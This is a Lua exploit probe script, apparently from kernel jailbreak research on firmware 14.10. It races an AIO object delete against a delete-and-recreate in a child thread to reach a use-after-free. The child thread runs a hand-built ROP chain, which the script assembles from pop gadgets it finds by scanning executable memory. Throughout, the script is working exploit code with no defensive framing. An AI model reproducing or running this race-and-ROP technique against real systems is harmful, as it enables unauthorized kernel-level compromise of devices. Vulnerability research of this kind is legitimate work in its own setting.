-- CRASH_CLASS: HIGH
-- PROBE 937b: aio delete vs delete+recreate race (the shape the 14.20 note fixes)
--
-- Context: the 14.20 aio_multi_delete change is described as "when
-- aio_multi_delete drops the lock to re-acquire the AIO object, a racing thread
-- could free and reallocate that slot; 14.10 would then free sub-objects of the
-- attacker-swapped object.  The new generation-ID check rejects a reused slot
-- before freeing."
--
-- Our measurements place the pieces on 14.10:
--   * 898a  submit -> cancel -> poll -> delete returns 0 (the object is freed)
--   * 894a  delete of an in-flight object without a poll returns 0x80020010
--           (busy), so the [in-flight] and [polled] checks are live
--   * 925a  a stale id is rejected at the FIRST lookup when the generation differs
-- What was never tried is the second half of the 14.20 sentence: another thread
-- freeing the slot and putting a NEW object back in it while the deleter is in
-- its dropped-lock window.
--
-- Chain of events this probe forces:
--   parent: create id X, poll it (sets the polled flag), spawn the child,
--           then delete X -- this delete is the one that drops the lock.
--   child : delete X first (frees slot), then create a fresh object with the
--           same shape; the slot allocator is LIFO (96d), so the fresh object
--           lands in X's slot.
--   parent: after the delete returns, poll the child's new id.  If the parent's
--           re-lookup accepted the reused slot, it freed the NEW object's
--           sub-objects, and this poll touches freed memory.
--
-- The child's five-argument create (669) works because the thread context
-- preloads RDI/RSI/RDX/RCX/R8/RAX -- the child's first call needs no pops --
-- and r8 survives the syscall (only rcx/r11 are clobbered), so the delete is
-- issued with pops and the create follows with rcx re-popped.

print("=== PROBE 937b: AIO DELETE vs DELETE+RECREATE ===")
print("")

local function to_num(v)
    if type(v) == "table" then
        if v.tonumber then local n = v:tonumber() if n then return n end end
        if v.h then return v.h * 4294967296 + v.l end
    end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return nil end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end); if o then return v end return nil end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
local pid0 = to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
print("[0] pid=" .. tostring(pid0))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)

local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local pop_rcx = find_pat(ebase, 0x494000, string.char(0x59, 0xC3))
print(string.format("[0] gadgets rax=%s rdi=%s rsi=%s rdx=%s rcx=%s",
    tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi), tostring(pop_rdx), tostring(pop_rcx)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx) then
    print("[0] missing gadget, abort")
    return
end

local PAGE = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

-- shared buffers
local idsP = mmap(PAGE)      -- parent's id out
local stP  = mmap(PAGE)      -- parent's status out
local reqs = mmap(PAGE)      -- submit request descriptors
local poll = mmap(PAGE)      -- poll out
local idsC = mmap(PAGE)      -- child's create out (also r8 target)
local stC  = mmap(PAGE)      -- child's delete status
local names = mmap(PAGE)
local block = mmap(PAGE * 4)
local start = block + PAGE * 4 - 0x200

print(string.format("[1] idsP=%X reqs=%X poll=%X idsC=%X block=%X", idsP, reqs, poll, idsC, block))

local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RCX = 0x060, R8 = 0x068, RAX = 0x078 }
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end

-- child chain: delete(idsC? no -- X) then create, then exit
-- delete: 662(ids=X_ptr, count=1, status=stC)
local Xslot -- filled after the parent creates
local function build_child(xptr, flags, data, count, mode, out)
    local ch = {
        pop_rdi, xptr, pop_rsi, 1, pop_rdx, stC, pop_rax, 662, fn,
        pop_rdi, flags, pop_rsi, data, pop_rdx, count, pop_rcx, mode, pop_rax, 669, fn,
        pop_rax, 431, fn,
    }
    for i = 1, #ch do wq(start + (i - 1) * 8, uint64(ch[i])) end
    zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start))
    -- first call arguments: delete(X, 1, stC)
    wq(ctx + Ctx.RDI, uint64(xptr)); wq(ctx + Ctx.RSI, uint64(1))
    wq(ctx + Ctx.RDX, uint64(stC)); wq(ctx + Ctx.RCX, uint64(0))
    wq(ctx + Ctx.R8, uint64(out)); wq(ctx + Ctx.RAX, uint64(662))
end

local function spawn()
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, rv
end

-- create the target object: 669(cmd=0x1001, reqs, count=1, mode=3, ids)
local function create_target()
    zero(idsP, 0x40)
    local ok, rv = pcall(function() return mk(669)(uint64(0x1001), uint64(reqs), uint64(1), uint64(3), uint64(idsP)) end)
    return ok, to_num(rv), rd(idsP)
end

local ROUNDS = 8
for round = 1, ROUNDS do
    print(string.format("-- round %d", round))
    local okC, rvC, x = create_target()
    print(string.format("   [C] create ok=%s rv=%d id=%s", tostring(okC), rvC, tostring(x)))
    if not x or x == 0 then
        print("   [C] no id, stopping")
        break
    end
    zero(poll, 0x40)
    local okP, rvP = pcall(function() return mk(664)(uint64(idsP), uint64(1), uint64(poll)) end)
    print(string.format("   [P] poll ok=%s rv=%s st=%s", tostring(okP), tostring(to_num(rvP)), tostring(rd(poll))))

    zero(idsC, 0x40); zero(stC, 0x40)
    build_child(idsP, 0x1001, reqs, 1, 3, idsC)
    local okS, rvS = spawn()
    print(string.format("   [S] spawn ok=%s rv=%s", tostring(okS), tostring(rvS)))

    zero(stP, 0x40)
    local okD, rvD = pcall(function() return mk(662)(uint64(idsP), uint64(1), uint64(stP)) end)
    print(string.format("   [P] delete ok=%s rv=%s st=%s", tostring(okD), tostring(to_num(rvD)), tostring(rd(stP))))

    sleep_ms(60)
    local newid = rd(idsC)
    print(string.format("   [K] child create id=%s child delete st=%s", tostring(newid), tostring(rd(stC))))
    if newid and newid ~= 0 then
        zero(poll, 0x40)
        local okQ, rvQ = pcall(function() return mk(664)(uint64(idsC), uint64(1), uint64(poll)) end)
        print(string.format("   [Q] poll(new) ok=%s rv=%s st=%s", tostring(okQ), tostring(to_num(rvQ)), tostring(rd(poll))))
    end
    print(string.format("   [A] alive pid=%s", tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)))))
end

print("")
print("=== PROBE 937b COMPLETE ===")
